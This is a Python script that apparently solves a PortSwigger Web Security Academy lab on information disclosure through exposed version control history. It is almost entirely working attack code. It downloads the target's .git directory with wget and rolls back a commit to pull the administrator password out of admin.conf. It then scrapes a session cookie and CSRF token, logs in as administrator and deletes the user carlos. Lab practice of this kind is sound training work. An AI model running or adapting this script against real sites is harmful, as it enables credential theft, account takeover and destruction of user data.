###############################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 4/9/2023
#
# Lab: Information disclosure in version control history
#
# Steps: 1. Fetch the .git directory
#        2. Reset to the previous commit
#        3. Get the administrator password from the admin.conf file
#        4. Login as administrator
#        5. Delete carlos
#
###############################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore
import os

# change this url to your lab
domain = "0a88000e03d4458e80275dcd00c600be.web-security-academy.net"

try:
    # fetch the .git directory
    fetch_git_dir = os.system(f"wget -r https://{domain}/.git")
    print(Fore.WHITE + "1. Fetching .git directory.. " + Fore.GREEN + "OK")

    # change current wroking directory
    os.chdir(domain)
    print(Fore.WHITE + "2. Changing current working directory.. " + Fore.GREEN + "OK")

    # reset to the previous commit
    print(Fore.WHITE + "3. Resetting to the previous commit.. " + Fore.GREEN + "OK")
    os.system("git reset --hard HEAD~1")

    # open the admin.conf file
    admin_conf = open("admin.conf").readline()
    print(Fore.WHITE + "4. Reading admin.conf file.. " + Fore.GREEN + "OK")

    # extract the administrator pass
    admin_pass = admin_conf.split("=")[1].split("\n")[0]
    print(Fore.WHITE + "5. Extracting the administrator password.. " +
          Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)

    # fetch login page, extract session cookie and csrf token
    try:
        get_login = requests.get(f"https://{domain}/login")
        if get_login.status_code == 200:
            print(Fore.WHITE + "6. Fetching login page to get a valid session and csrf token.. " + Fore.GREEN + "OK")
            session = get_login.cookies.get("session")
            csrf = re.findall("csrf.+value=\"(.+)\"",
                              get_login.content.decode())[0]
            try: # try to login as administrator
                data = {
                    "username": "administrator",
                    "password": admin_pass,
                    "csrf": csrf
                }
                cookies = {
                    "session": session
                }
                login = requests.post(
                    f"https://{domain}/login", data, cookies=cookies, allow_redirects=False)
                if login.status_code == 302:
                    print(
                        Fore.WHITE + "7. Logging in as administrator.. " + Fore.GREEN + "OK")
                    try: #  try to delete carlos
                        new_session = login.cookies.get("session") # get the new session after logging in
                        cookies = {
                            "session": new_session
                        }
                        delete_carlos = requests.get(
                            f"https://{domain}/admin/delete?username=carlos", cookies=cookies)
                        if delete_carlos.status_code == 200:
                            print(Fore.WHITE + "8. Deleting carlos.. " +
                                  Fore.GREEN + "OK")
                            print(
                                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                    except:
                        print(Fore.RED + "[!] Failed to delet carlos")
            except:
                print(Fore.RED + "[!] Failed to login")
    except:
        print(Fore.RED + "[!] Failed to GET /login page")
except:
    print(Fore.RED + "[!] Failed to fetch .git directory")
